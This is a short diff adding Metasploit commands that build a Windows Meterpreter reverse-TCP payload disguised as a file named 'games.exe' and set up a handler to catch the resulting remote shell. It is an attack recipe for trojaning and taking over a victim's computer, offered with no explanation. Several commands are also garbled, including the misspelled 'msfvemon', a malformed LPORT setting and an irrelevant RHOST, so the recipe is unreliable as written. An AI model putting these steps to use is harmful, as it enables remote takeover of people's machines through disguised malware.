@@ -1,0 +1,7 @@
+msfconsole
+msfvemon -p windows/meterpreter/reverse_tcp LHOST=<local ip> LPORT<local port> --format= exe >games.exe
+use exploit/multi/handler
+set LHOST
+set RHOST
+set payload windows/meterpreter/reverse_tcp
+exploit
